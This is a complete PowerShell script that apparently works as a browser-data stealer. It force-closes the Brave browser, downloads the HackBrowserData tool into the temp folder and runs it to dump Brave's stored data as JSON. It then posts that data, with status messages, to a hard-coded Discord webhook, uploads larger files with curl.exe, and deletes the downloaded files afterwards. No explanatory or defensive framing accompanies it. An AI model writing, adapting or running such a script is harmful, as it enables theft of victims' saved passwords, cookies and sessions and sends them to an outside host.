$wh="https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

function Send {
    param([string]$m)
    Invoke-RestMethod -Uri $wh -Method Post -Body (@{content=$m}|ConvertTo-Json) -ContentType "application/json"|Out-Null
}

Send "🔧 Trying HackBrowserData..."

Get-Process brave -EA 0|Stop-Process -Force -EA 0
Start-Sleep 5

cd $env:TEMP

[Net.ServicePointManager]::SecurityProtocol='Tls12'

try {
    Invoke-WebRequest "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-v0.4.6-windows-amd64.zip" -OutFile "hbd.zip" -UseBasicParsing
    
    Send "✅ Downloaded, extracting..."
    
    Expand-Archive "hbd.zip" "hbd" -Force
    cd hbd
    
    Send "▶️ Running extraction..."
    
    $output = .\hack-browser-data.exe -b brave -f json --dir results 2>&1|Out-String
    
    Start-Sleep 5
    
    Send "Output: $output"
    
    $files = Get-ChildItem results -Recurse -File -EA 0
    
    if ($files) {
        Send "📁 Found $($files.Count) files"
        
        foreach ($file in $files) {
            Send "File: $($file.Name) ($($file.Length) bytes)"
            
            if ($file.Extension -eq ".json") {
                $content = Get-Content $file.FullName -Raw
                
                if ($content.Length -lt 1500) {
                    Send $content
                } else {
                    $content|Out-File "$env:TEMP\result.txt" -Encoding UTF8
                    curl.exe -F "file=@$env:TEMP\result.txt" $wh
                    Remove-Item "$env:TEMP\result.txt"
                }
            }
        }
    } else {
        Send "❌ No files generated"
    }
    
    cd $env:TEMP
    Remove-Item hbd,hbd.zip -Recurse -Force
    
} catch {
    Send "❌ Error: $($_.Exception.Message)"
}

Send "🏁 Done"
